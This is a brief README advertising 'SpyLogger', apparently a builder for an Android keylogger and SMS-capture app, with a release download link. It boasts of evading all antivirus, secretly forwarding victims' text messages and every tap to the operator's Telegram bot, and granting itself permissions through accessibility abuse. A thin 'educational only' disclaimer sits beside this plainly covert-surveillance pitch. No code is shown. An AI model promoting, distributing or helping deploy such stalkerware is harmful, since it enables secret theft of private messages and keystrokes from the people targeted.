# SpyLogger
Android KeyLogger and SMS Capture (software is meant for educational)

**Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.

## GUI Screenshot
![SpyLogger](Screenshots/GUI.png "SpyLogger in action")

## Features of SpyLogger

* Fully undetectable by any antivirus
* Capture new text messages and send them to your Telegram bot
* Send all clicks to your Telegram bote
* Choose the Activity Main method when accessibility is Enabled (HTML File, WebView, OpenLink, Open Another App, Toast Message)
* Auto Permissions

## Requisites
* .NET Framework 4.8

## [Download](https://github.com/A-LedearDev/SpyLogger/releases/tag/Release)
